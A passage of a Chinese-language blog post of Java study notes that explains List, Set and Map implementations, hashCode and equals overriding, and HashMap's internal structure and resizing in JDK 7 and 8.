class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>

<h4 id="List的一个面试题"><a href="#List的一个面试题" class="headerlink" title="List的一个面试题"></a>List的一个面试题</h4><ul>
<li>面试题1</li>
</ul>
<blockquote>
<p>请问ArrayList&#x2F;LinkedList&#x2F;Vector的异同？谈谈你的理解？ArrayList底层是什么？扩容机制？Vector和ArrayList的最大区别?</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 请问ArrayList/LinkedList/Vector的异同？谈谈你的理解？</span></span><br><span class="line"><span class="comment">  * ArrayList底层是什么？扩容机制？Vector和ArrayList的最大区别?</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * ArrayList和LinkedList的异同二者都线程不安全，相对线程安全的Vector，执行效率高。</span></span><br><span class="line"><span class="comment">  * 此外，ArrayList是实现了基于动态数组的数据结构，LinkedList基于链表的数据结构。</span></span><br><span class="line"><span class="comment">  * 对于随机访问get和set，ArrayList觉得优于LinkedList，因为LinkedList要移动指针。</span></span><br><span class="line"><span class="comment">  * 对于新增和删除操作add(特指插入)和remove，LinkedList比较占优势，因为ArrayList要移动数据。</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * ArrayList和Vector的区别Vector和ArrayList几乎是完全相同的,</span></span><br><span class="line"><span class="comment">  * 唯一的区别在于Vector是同步类(synchronized)，属于强同步类。</span></span><br><span class="line"><span class="comment">  * 因此开销就比ArrayList要大，访问要慢。正常情况下,</span></span><br><span class="line"><span class="comment">  * 大多数的Java程序员使用ArrayList而不是Vector,</span></span><br><span class="line"><span class="comment">  * 因为同步完全可以由程序员自己来控制。Vector每次扩容请求其大小的2倍空间，</span></span><br><span class="line"><span class="comment">  * 而ArrayList是1.5倍。Vector还有一个子类Stack。</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<h3 id="5、Collection子接口之二：Set接口"><a href="#5、Collection子接口之二：Set接口" class="headerlink" title="5、Collection子接口之二：Set接口"></a>5、Collection子接口之二：Set接口</h3><ul>
<li>Set接口是Collection的子接口，set接口没有提供额外的方法</li>
<li>Set 集合不允许包含相同的元素，如果试把两个相同的元素加入同一个Set 集合中，则添加操作失败。</li>
<li>Set 判断两个对象是否相同不是使用&#x3D;&#x3D; 运算符，而是根据equals() 方法</li>
</ul>
<h4 id="Set接口实现类的对比"><a href="#Set接口实现类的对比" class="headerlink" title="Set接口实现类的对比"></a>Set接口实现类的对比</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1.Set接口的框架：</span></span><br><span class="line"><span class="comment"> * |----Collection接口：单列集合，用来存储一个一个的对象</span></span><br><span class="line"><span class="comment"> *          |----Set接口：存储无序的、不可重复的数据   --&gt;高中讲的“集合”</span></span><br><span class="line"><span class="comment"> *             |----HashSet：作为Set接口的主要实现类；线程不安全的；可以存储null值</span></span><br><span class="line"><span class="comment"> *                 |----LinkedHashSet：作为HashSet的子类；遍历其内部数据时，可以按照添加的顺序遍历</span></span><br><span class="line"><span class="comment"> *                                    对于频繁的遍历操作，LinkedHashSet效率高于HashSet.</span></span><br><span class="line"><span class="comment"> *             |----TreeSet：可以按照添加对象的指定属性，进行排序。</span></span><br><span class="line"><span class="comment"> *</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="HashSet中元素的添加过程"><a href="#HashSet中元素的添加过程" class="headerlink" title="HashSet中元素的添加过程"></a>HashSet中元素的添加过程</h4><ul>
<li><p>HashSet是Set 接口的典型实现，大多数时候使用Set 集合时都使用这个实现类。</p>
</li>
<li><p>HashSet按Hash 算法来存储集合中的元素，因此具有很好的存取、查找、删除性能。</p>
</li>
<li><p>HashSet具有以下特点：不能保证元素的排列顺序</p>
<ul>
<li>HashSet不是线程安全的</li>
<li>集合元素可以是null</li>
</ul>
</li>
<li><p>HashSet 集合判断两个元素相等的标准：两个对象通过hashCode() 方法比较相等，并且两个对象的equals() 方法返回值也相等。</p>
</li>
<li><p>对于存放在Set容器中的对象，对应的类一定要重写equals()和hashCode(Object obj)方法，以实现对象相等规则。即：“<strong>相等的对象必须具有相等的散列码</strong>”。</p>
</li>
<li></li>
</ul>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 一、Set:存储无序的、不可重复的数据</span></span><br><span class="line"><span class="comment">     *      1.无序性：不等于随机性。存储的数据在底层数组中并非按照数组索引的顺序添加，而是根据数据的哈希值决定的。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *      2.不可重复性：保证添加的元素按照equals()判断时，不能返回true.即：相同的元素只能添加一个。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 二、添加元素的过程：以HashSet为例：</span></span><br><span class="line"><span class="comment">     *      我们向HashSet中添加元素a,首先调用元素a所在类的hashCode()方法，计算元素a的哈希值，</span></span><br><span class="line"><span class="comment">     *      此哈希值接着通过某种算法计算出在HashSet底层数组中的存放位置（即为：索引位置），判断</span></span><br><span class="line"><span class="comment">     *      数组此位置上是否已经有元素：</span></span><br><span class="line"><span class="comment">     *          如果此位置上没有其他元素，则元素a添加成功。 ---&gt;情况1</span></span><br><span class="line"><span class="comment">     *          如果此位置上有其他元素b(或以链表形式存在的多个元素），则比较元素a与元素b的hash值：</span></span><br><span class="line"><span class="comment">     *              如果hash值不相同，则元素a添加成功。---&gt;情况2</span></span><br><span class="line"><span class="comment">     *              如果hash值相同，进而需要调用元素a所在类的equals()方法：</span></span><br><span class="line"><span class="comment">     *                    equals()返回true,元素a添加失败</span></span><br><span class="line"><span class="comment">     *                    equals()返回false,则元素a添加成功。---&gt;情况2</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *      对于添加成功的情况2和情况3而言：元素a 与已经存在指定索引位置上数据以链表的方式存储。</span></span><br><span class="line"><span class="comment">     *      jdk 7 :元素a放到数组中，指向原来的元素。</span></span><br><span class="line"><span class="comment">     *      jdk 8 :原来的元素在数组中，指向元素a</span></span><br><span class="line"><span class="comment">     *      总结：七上八下</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * HashSet底层：数组+链表的结构。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/4c965e78676367af02bdc233fcd4e21a--3bb8--image-20240926154223158.png" alt="image-20240926154223158"></p>
<p>底层也是数组，初始容量为16，当如果使用率超过0.75，（16*0.75&#x3D;12）就会扩大容量为原来的2倍。（16扩容为32，依次为64,128….等）</p>
<h4 id="关于hashCode-和equals-的重写"><a href="#关于hashCode-和equals-的重写" class="headerlink" title="关于hashCode()和equals()的重写"></a>关于hashCode()和equals()的重写</h4><h5 id="重写hashCode-方法的基本原则"><a href="#重写hashCode-方法的基本原则" class="headerlink" title="重写hashCode() 方法的基本原则"></a>重写hashCode() 方法的基本原则</h5><ul>
<li>在程序运行时，同一个对象多次调用hashCode() 方法应该返回相同的值。</li>
<li>当两个对象的equals() 方法比较返回true 时，这两个对象的hashCode() 方法的返回值也应相等。</li>
<li>对象中用作equals() 方法比较的Field，都应该用来计算hashCode 值。</li>
</ul>
<h5 id="重写equals-方法的基本原则"><a href="#重写equals-方法的基本原则" class="headerlink" title="重写equals() 方法的基本原则"></a>重写equals() 方法的基本原则</h5><blockquote>
<p>以自定义的Customer类为例，何时需要重写equals()？</p>
</blockquote>
<ul>
<li>当一个类有自己特有的“逻辑相等”概念,当改写equals()的时候，总是要改写hashCode()，根据一个类的equals方法（改写后），两个截然不同的实例有可能在逻辑上是相等的，但是，根据Object.hashCode()方法，它们仅仅是两个对象。</li>
<li>因此，违反了“<strong>相等的对象必须具有相等的散列码</strong>”。</li>
<li>结论：复写equals方法的时候一般都需要同时复写hashCode方法。通常参与计算hashCode的对象的属性也应该参与到equals()中进行计算。</li>
</ul>
<h5 id="Eclipse-IDEA工具里hashCode-的重写"><a href="#Eclipse-IDEA工具里hashCode-的重写" class="headerlink" title="Eclipse&#x2F;IDEA工具里hashCode()的重写"></a>Eclipse&#x2F;IDEA工具里hashCode()的重写</h5><blockquote>
<p>以Eclipse&#x2F;IDEA为例，在自定义类中可以调用工具自动重写equals和hashCode。问题：为什么用Eclipse&#x2F;IDEA复写hashCode方法，有31这个数字？</p>
</blockquote>
<ul>
<li>选择系数的时候要选择尽量大的系数。因为如果计算出来的hash地址越大，所谓的“冲突”就越少，查找起来效率也会提高。（减少冲突）</li>
<li>并且31只占用5bits,相乘造成数据溢出的概率较小。</li>
<li>31可以由i*31&#x3D;&#x3D; (i&lt;&lt;5)-1来表示,现在很多虚拟机里面都有做相关优化。（提高算法效率）</li>
<li>31是一个素数，素数作用就是如果我用一个数字来乘以这个素数，那么最终出来的结果只能被素数本身和被乘数还有1来整除！(减少冲突)</li>
</ul>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 2.要求：向Set(主要指：HashSet、LinkedHashSet)中添加的数据，其所在的类一定要重写hashCode()和equals()</span></span><br><span class="line"><span class="comment">  *   要求：重写的hashCode()和equals()尽可能保持一致性：相等的对象必须具有相等的散列码</span></span><br><span class="line"><span class="comment">  *        重写两个方法的小技巧：对象中用作 equals() 方法比较的 Field，都应该用来计算 hashCode 值。</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="LinkedHashSet的使用"><a href="#LinkedHashSet的使用" class="headerlink" title="LinkedHashSet的使用"></a>LinkedHashSet的使用</h4><ul>
<li>LinkedHashSet是HashSet的子类</li>
<li>LinkedHashSet根据元素的hashCode值来决定元素的存储位置，但它同时使用双向链表维护元素的次序，这使得元素看起来是以<strong>插入顺序保存</strong>的。</li>
<li><strong>LinkedHashSet插入性能略低于HashSet</strong>，但在迭代访问Set 里的全部元素时有很好的性能。</li>
<li>LinkedHashSet不允许集合元素重复。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/4cc23d898e14d8003b0ae66094b41ed2--e610--image-20240926154251866.png" alt="image-20240926154251866"></p>
<h4 id="TreeSet的自然排序"><a href="#TreeSet的自然排序" class="headerlink" title="TreeSet的自然排序"></a>TreeSet的自然排序</h4><ul>
<li><p>TreeSet是SortedSet接口的实现类，TreeSet可以确保集合元素处于排序状态。</p>
</li>
<li><p>TreeSet底层使用<strong>红黑树</strong>结构存储数据</p>
</li>
<li><p>新增的方法如下：(了解)</p>
<ul>
<li>Comparator comparator()</li>
<li>Object first()</li>
<li>Object last()</li>
<li>Object lower(Object e)</li>
<li>Object higher(Object e)</li>
<li>SortedSet subSet(fromElement, toElement)</li>
<li>SortedSet headSet(toElement)</li>
<li>SortedSet tailSet(fromElement)</li>
</ul>
</li>
<li><p>TreeSet两种排序方法：<strong>自然排序和定制排序</strong>。默认情况下，TreeSet采用自然排序。</p>
</li>
<li><p>TreeSet和后面要讲的TreeMap采用红黑树的存储结构</p>
</li>
<li><p>特点：有序，查询速度比List快</p>
</li>
</ul>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/72532b7ff7aafd3013078e556dcd5789--c2f7--image-20240926155705628.png" alt="image-20240926155705628"></p>
<ul>
<li><p>自然排序：TreeSet会调用集合元素的compareTo(Object obj) 方法来比较元素之间的大小关系，然后将集合元素按升序(默认情况)排列。</p>
</li>
<li><p><strong>如果试图把一个对象添加到TreeSet时，则该对象的类必须实现Comparable 接口</strong>。</p>
<ul>
<li>实现Comparable 的类必须实现compareTo(Object obj) 方法，两个对象即通过compareTo(Object obj) 方法的返回值来比较大小。</li>
</ul>
</li>
<li><p>Comparable 的典型实现：</p>
<ul>
<li>BigDecimal、BigInteger 以及所有的数值型对应的包装类：按它们对应的数值大小进行比较</li>
<li>Character：按字符的unicode值来进行比较</li>
<li>Boolean：true 对应的包装类实例大于false 对应的包装类实例</li>
<li>String：按字符串中字符的unicode 值进行比较</li>
<li>Date、Time：后边的时间、日期比前面的时间、日期大</li>
</ul>
</li>
<li><p>向TreeSet中添加元素时，只有第一个元素无须比较compareTo()方法，后面添加的所有元素都会调用compareTo()方法进行比较。</p>
</li>
<li><p><strong>因为只有相同类的两个实例才会比较大小，所以向TreeSet中添加的应该是同一个类的对象</strong>。</p>
</li>
<li><p>对于TreeSet集合而言，它<strong>判断两个对象是否相等的唯一标准</strong>是：两个对象通过compareTo(Object obj) 方法比较返回值。</p>
</li>
<li><p>当需要把一个对象放入TreeSet中，重写该对象对应的equals() 方法时，应保证该方法与compareTo(Object obj) 方法有一致的结果：如果两个对象通过equals() 方法比较返回true，则通过compareTo(Object obj) 方法比较应返回0。否则，让人难以理解。</p>
</li>
</ul>
<h4 id="TreeSet的定制排序"><a href="#TreeSet的定制排序" class="headerlink" title="TreeSet的定制排序"></a>TreeSet的定制排序</h4><ul>
<li>TreeSet的自然排序要求元素所属的类实现Comparable接口，如果元素所属的类没有实现Comparable接口，或不希望按照升序(默认情况)的方式排列元素或希望按照其它属性大小进行排序，则考虑使用定制排序。定制排序，通过Comparator接口来实现。需要重写compare(T o1,T o2)方法。</li>
<li>利用int compare(T o1,T o2)方法，比较o1和o2的大小：如果方法返回正整数，则表示o1大于o2；如果返回0，表示相等；返回负整数，表示o1小于o2。</li>
<li>要实现定制排序，需要将实现Comparator接口的实例作为形参传递给TreeSet的构造器。</li>
<li>此时，仍然只能向TreeSet中添加类型相同的对象。否则发生ClassCastException异常。</li>
<li>使用定制排序判断两个元素相等的标准是：通过Comparator比较两个元素返回了0。</li>
</ul>
<h3 id="6、Map接口"><a href="#6、Map接口" class="headerlink" title="6、Map接口"></a>6、Map接口</h3><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/016b16f866b8814053813f34ef5ecd04--3ebe--image-20240926160356106.png" alt="image-20240926160356106"></p>
<h4 id="Map中存储的key-value的特点"><a href="#Map中存储的key-value的特点" class="headerlink" title="Map中存储的key-value的特点"></a>Map中存储的key-value的特点</h4><ul>
<li>Map与Collection并列存在。用于保存具有映射关系的数据:key-value</li>
<li>Map 中的key 和value 都可以是任何引用类型的数据</li>
<li>Map 中的key 用Set来存放，不允许重复，即同一个Map 对象所对应的类，须重写hashCode()和equals()方法</li>
<li>常用String类作为Map的“键”</li>
<li>key 和value 之间存在单向一对一关系，即通过指定的key 总能找到唯一的、确定的value</li>
<li>Map接口的常用实现类：HashMap、TreeMap、LinkedHashMap和Properties。其中，HashMap是Map 接口使用频率最高的实现类</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/5c6b47f892f9a5a48d33dfd7eac19e22--580b--image-20240926160454945.png" alt="image-20240926160454945"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  *  二、Map结构的理解：</span></span><br><span class="line"><span class="comment">  *    Map中的key:无序的、不可重复的，使用Set存储所有的key  ---&gt; key所在的类要重写equals()和hashCode() （以HashMap为例）</span></span><br><span class="line"><span class="comment">  *    Map中的value:无序的、可重复的，使用Collection存储所有的value ---&gt;value所在的类要重写equals()</span></span><br><span class="line"><span class="comment">  *    一个键值对：key-value构成了一个Entry对象。</span></span><br><span class="line"><span class="comment">  *    Map中的entry:无序的、不可重复的，使用Set存储所有的entry</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  */</span>   </span><br></pre></td></tr></table></figure>

<h4 id="Map实现类之一：HashMap"><a href="#Map实现类之一：HashMap" class="headerlink" title="Map实现类之一：HashMap"></a>Map实现类之一：HashMap</h4><ul>
<li><strong>HashMap是Map 接口使用频率最高的实现类</strong>。</li>
<li>允许使用null键和null值，与HashSet一样，不保证映射的顺序。</li>
<li>所有的key构成的集合是Set:无序的、不可重复的。所以，key所在的类要重写：equals()和hashCode()</li>
<li>所有的value构成的集合是Collection:无序的、可以重复的。所以，value所在的类要重写：equals()</li>
<li>一个key-value构成一个entry</li>
<li>所有的entry构成的集合是Set:无序的、不可重复的</li>
<li>HashMap 判断两个key 相等的标准是：两个key 通过equals() 方法返回true，hashCode值也相等。</li>
<li>HashMap判断两个value相等的标准是：两个value 通过equals() 方法返回true。</li>
</ul>
<h4 id="HashMap的底层实现原理"><a href="#HashMap的底层实现原理" class="headerlink" title="HashMap的底层实现原理"></a>HashMap的底层实现原理</h4><blockquote>
<p>JDK 7及以前版本：HashMap是数组+链表结构(即为链地址法)</p>
<p>JDK 8版本发布以后：HashMap是数组+链表+红黑树实现。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/ec2168962e0afd8308af7a84307e36c3--d616--image-20240926161011409.png" alt="image-20240926161011409"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/f366179f78492670947d2f3c225434b1--5796--image-20240926161016501.png" alt="image-20240926161016501"></p>
<ul>
<li>HashMap源码中的重要常量</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *      DEFAULT_INITIAL_CAPACITY : HashMap的默认容量，16</span></span><br><span class="line"><span class="comment"> *      DEFAULT_LOAD_FACTOR：HashMap的默认加载因子：0.75</span></span><br><span class="line"><span class="comment"> *      threshold：扩容的临界值，=容量*填充因子：16 * 0.75 =&gt; 12</span></span><br><span class="line"><span class="comment"> *      TREEIFY_THRESHOLD：Bucket中链表长度大于该默认值，转化为红黑树:8</span></span><br><span class="line"><span class="comment"> *      MIN_TREEIFY_CAPACITY：桶中的Node被树化时最小的hash表容量:64</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h5 id="HashMap在JDK7中的底层实现原理"><a href="#HashMap在JDK7中的底层实现原理" class="headerlink" title="HashMap在JDK7中的底层实现原理"></a>HashMap在JDK7中的底层实现原理</h5><ul>
<li>HashMap的内部存储结构其实是<strong>数组和链表的结合</strong>。当实例化一个HashMap时，系统会创建一个长度为Capacity的Entry数组，这个长度在哈希表中被称为容量(Capacity)，在这个数组中可以存放元素的位置我们称之为“桶”(bucket)，每个bucket都有自己的索引，系统可以根据索引快速的查找bucket中的元素。</li>
<li>每个bucket中存储一个元素，即一个Entry对象，但每一个Entry对象可以带一个引用变量，用于指向下一个元素，因此，在一个桶中，就有可能生成一个Entry链。而且新添加的元素作为链表的head。</li>
<li>添加元素的过程：<ul>
<li>向HashMap中添加entry1(key，value)，需要首先计算entry1中key的哈希值(根据key所在类的hashCode()计算得到)，此哈希值经过处理以后，得到在底层Entry[]数组中要存储的位置i。如果位置i上没有元素，则entry1直接添加成功。如果位置i上已经存在entry2(或还有链表存在的entry3，entry4)，则需要通过循环的方法，依次比较entry1中key和其他的entry。如果彼此hash值不同，则直接添加成功。如果hash值不同，继续比较二者是否equals。如果返回值为true，则使用entry1的value去替换equals为true的entry的value。如果遍历一遍以后，发现所有的equals返回都为false,则entry1仍可添加成功。entry1指向原有的entry元素。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 三、HashMap的底层实现原理？以jdk7为例说明：</span></span><br><span class="line"><span class="comment"> *    HashMap map = new HashMap():</span></span><br><span class="line"><span class="comment"> *    在实例化以后，底层创建了长度是16的一维数组Entry[] table。</span></span><br><span class="line"><span class="comment"> *    ...可能已经执行过多次put...</span></span><br><span class="line"><span class="comment"> *    map.put(key1,value1):</span></span><br><span class="line"><span class="comment"> *    首先，调用key1所在类的hashCode()计算key1哈希值，此哈希值经过某种算法计算以后，得到在Entry数组中的存放位置。</span></span><br><span class="line"><span class="comment"> *    如果此位置上的数据为空，此时的key1-value1添加成功。 ----情况1</span></span><br><span class="line"><span class="comment"> *    如果此位置上的数据不为空，(意味着此位置上存在一个或多个数据(以链表形式存在)),比较key1和已经存在的一个或多个数据</span></span><br><span class="line"><span class="comment"> *    的哈希值：</span></span><br><span class="line"><span class="comment"> *           如果key1的哈希值与已经存在的数据的哈希值都不相同，此时key1-value1添加成功。----情况2</span></span><br><span class="line"><span class="comment"> *           如果key1的哈希值和已经存在的某一个数据(key2-value2)的哈希值相同，继续比较：调用key1所在类的equals(key2)方法，比较：</span></span><br><span class="line"><span class="comment"> *                如果equals()返回false:此时key1-value1添加成功。----情况3</span></span><br><span class="line"><span class="comment"> *                如果equals()返回true:使用value1替换value2。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   补充：关于情况2和情况3：此时key1-value1和原来的数据以链表的方式存储。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   在不断的添加过程中，会涉及到扩容问题，当超出临界值(且要存放的位置非空)时，扩容。默认的扩容方式：扩容为原来容量的2倍，并将原有的数据复制过来。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * HashMap的扩容</span></span><br><span class="line"><span class="comment">  *     当HashMap中的元素越来越多的时候，hash冲突的几率也就越来越高，</span></span><br><span class="line"><span class="comment">  *     因为数组的长度是固定的。所以为了提高查询的效率，</span></span><br><span class="line"><span class="comment">  *     就要对HashMap的数组进行扩容，而在HashMap数组扩容之后，</span></span><br><span class="line"><span class="comment">  *     最消耗性能的点就出现了：原数组中的数据必须重新计算其在新数组中的位置，</span></span><br><span class="line"><span class="comment">  *     并放进去，这就是resize。</span></span><br><span class="line"><span class="comment">  *     </span></span><br><span class="line"><span class="comment">  * 那么HashMap什么时候进行扩容呢？</span></span><br><span class="line"><span class="comment">  *      当HashMap中的元素个数超过数组大小(数组总大小length,</span></span><br><span class="line"><span class="comment">  *      不是数组中个数size)*loadFactor时，就 会 进 行 数 组 扩 容，</span></span><br><span class="line"><span class="comment">  *      loadFactor的默认值(DEFAULT_LOAD_FACTOR)为0.75，这是一个折中的取值。</span></span><br><span class="line"><span class="comment">  *      也就是说，默认情况下，数组大小(DEFAULT_INITIAL_CAPACITY)为16，</span></span><br><span class="line"><span class="comment">  *      那么当HashMap中元素个数超过16*0.75=12（这个值就是代码中的threshold值，</span></span><br><span class="line"><span class="comment">  *      也叫做临界值）的时候，就把数组的大小扩展为2*16=32，即扩大一倍，</span></span><br><span class="line"><span class="comment">  *      然后重新计算每个元素在数组中的位置，而这是一个非常消耗性能的操作，</span></span><br><span class="line"><span class="comment">  *      所以如果我们已经预知HashMap中元素的个数，</span></span><br><span class="line"><span class="comment">  *      那么预设元素的个数能够有效的提高HashMap的性能。</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<h5 id="HashMap在JDK8中的底层实现原理"><a href="#HashMap在JDK8中的底层实现原理" class="headerlink" title="HashMap在JDK8中的底层实现原理"></a>HashMap在JDK8中的底层实现原理</h5><ul>
<li><p>HashMap的内部存储结构其实是数组+链表+树的结合。当实例化一个HashMap时，会初始化initialCapacity和loadFactor，在put第一对映射关系时，系统会创建一个长度为initialCapacity的Node数组，这个长度在哈希表中被称为容量(Capacity)，在这个数组中可以存放元素的位置我们称之为“桶”(bucket)，每个bucket都有自己的索引，系统可以根据索引快速的查找bucket中的元素。</p>
</li>
<li><p>每个bucket中存储一个元素，即一个Node对象，但每一个Node对象可以带一个引用变量next，用于指向下一个元素，因此，在一个桶中，就有可能生成一个Node链。也可能是一个一个TreeNode对象，每一个TreeNode对象可以有两个叶子结点left和right，因此，在一个桶中，就有可能生成一个TreeNode树。而新添加的元素作为链表的last，或树的叶子结点。</p>
</li>
<li><p><strong>那么HashMap什么时候进行扩容和树形化呢？</strong></p>
<blockquote>
<p>当HashMap中的元素个数超过数组大小(数组总大小length,不是数组中个数size)<em>loadFactor时，就会进行数组扩容，loadFactor的默认值(DEFAULT_LOAD_FACTOR)为0.75，这是一个折中的取值。也就是说，默认情况下，数组大小(DEFAULT_INITIAL_CAPACITY)为16，那么当HashMap中元素个数超过16</em>0.75&#x3D;12（这个值就是代码中的threshold值，也叫做临界值）的时候，就把数组的大小扩展为2*16&#x3D;32，即扩大一倍，然后重新计算每个元素在数组中的位置，而这是一个非常消耗性能的操作，所以如果我们已经预知HashMap中元素的个数，那么预设元素的个数能够有效的提高HashMap的性能。</p>
</blockquote>
</li>
<li><p>当HashMap中的其中一个链的对象个数如果达到了8个，此时如果capacity没有达到64，那么HashMap会先扩容解决，如果已经达到了64，那么这个链会变成树，结点类型由Node变成TreeNode类型。当然，如果当映射关系被移除后，下次resize方法时判断树的结点个数低于6个，也会把树再转为链表。</p>
</li>
<li><p><strong>关于映射关系的key是否可以修改？answer：不要修改</strong></p>
<blockquote>
<p>映射关系存储到HashMap中会存储key的hash值，这样就不用在每次查找时重新计算每一个Entry或Node（TreeNode）的hash值了，因此如果已经put到Map中的映射关系，再修改key的属性，而这个属性又参与hashcode值的计算，那么会导致匹配不上。</p>
</blockquote>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 总结：</span></span><br><span class="line"><span class="comment"> *   jdk8 相较于jdk7在底层实现方面的不同：</span></span><br><span class="line"><span class="comment"> *      1.new HashMap():底层没有创建一个长度为16的数组</span></span><br><span class="line"><span class="comment"> *      2.jdk 8底层的数组是：Node[],而非Entry[]</span></span><br><span class="line"><span class="comment"> *      3.首次调用put()方法时，底层创建长度为16的数组</span></span><br><span class="line"><span class="comment"> *      4.jdk7底层结构只有：数组+链表。jdk8中底层结构：数组+链表+红黑树。</span></span><br><span class="line"><span class="comment"> *         4.1形成链表时，七上八下（jdk7:新的元素指向旧的元素。jdk8：旧的元素指向新的元素）</span></span><br><span class="line"><span class="comment"> *         4.2当数组的某一个索引位置上的元素以链表形式存在的数据个数 &gt; 8 且当前数组的长度 &gt; 64时，此时此索引位置上的所数据改为使用红黑树存储。</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h4 id="LinkedHashMap的底层实现原理（了解！！！）"><a href="#LinkedHashMap的底层实现原理（了解！！！）" class="headerlink" title="LinkedHashMap的底层实现原理（了解！！！）"></a>LinkedHashMap的底层实现原理（了解！！！）</h4><ul>
<li><p>LinkedHashMap是HashMap的子类</p>
</li>
<li><p>在HashMap存储结构的基础上，使用了一对双向链表来记录添加元素的顺序</p>
</li>
<li><p>与LinkedHashSet类似，LinkedHashMap可以维护Map 的迭代顺序：迭代顺序与Key-Value 对的插入顺序一致</p>
</li>
<li><p>HashMap中的内部类：Node</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/5def8a853d13145aec0fac58b21ec825--dc6e--image-20240926161107656.png" alt="image-20240926161107656"></p>
<ul>
<li>LinkedHashMap中的内部类：Entry</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/a74194cb166be60b7c14d33841288421--a599--image-20240926161127564.png" alt="image-20240926161127564"></p>
<h4 id="Map中的常用方法"><a href="#Map中的常用方法" class="headerlink" title="Map中的常用方法"></a>Map中的常用方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  五、Map中定义的方法：</span></span><br><span class="line"><span class="comment"> *      添加、删除、修改操作：</span></span><br><span class="line"><span class="comment"> *      Object put(Object key,Object value)：将指定key-value添加到(或修改)当前map对象中</span></span><br><span class="line"><span class="comment"> *      void putAll(Map m):将m中的所有key-value对存放到当前map中</span></span><br><span class="line"><span class="comment"> *      Object remove(Object key)：移除指定key的key-value对，并返回value</span></span><br><span class="line"><span class="comment"> *      void clear()：清空当前map中的所有数据</span></span><br><span class="line"><span class="comment"> *      元素查询的操作：</span></span><br><span class="line"><span class="comment"> *      Object get(Object key)：获取指定key对应的value</span></span><br><span class="line"><span class="comment"> *      boolean containsKey(Object key)：是否包含指定的key</span></span><br><span class="line"><span class="comment"> *      boolean containsValue(Object value)：是否包含指定的value</span></span><br><span class="line"><span class="comment"> *      int size()：返回map中key-value对的个数</span></span><br><span class="line"><span class="comment"> *      boolean isEmpty()：判断当前map是否为空</span></span><br><span class="line"><span class="comment"> *      boolean equals(Object obj)：判断当前map和参数对象obj是否相等</span></span><br><span class="line"><span class="comment"> *      元视图操作的方法：</span></span><br><span class="line"><span class="comment"> *      Set keySet()：返回所有key构成的Set集合</span></span><br><span class="line"><span class="comment"> *      Collection values()：返回所有value构成的Collection集合</span></span><br><span class="line"><span class="comment"> *      Set entrySet()：返回所有key-value对构成的Set集合</span></span><br><span class="line"><span class="comment"> *总结：常用方法：</span></span><br><span class="line"><span class="comment"> *    添加：put(Object key,Object value)</span></span><br><span class="line"><span class="comment"> *    删除：remove(Object key)</span></span><br><span class="line"><span class="comment"> *    修改：put(Object key,Object value)</span></span><br><span class="line"><span class="comment"> *    查询：get(Object key)</span></span><br><span class="line"><span class="comment"> *    长度：size()</span></span><br><span class="line"><span class="comment"> *    遍历：keySet() / values() / entrySet()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  面试题：</span></span><br><span class="line"><span class="comment"> *  1. HashMap的底层实现原理？</span></span><br><span class="line"><span class="comment"> *  2. HashMap 和 Hashtable的异同？</span></span><br><span class="line"><span class="comment"> *      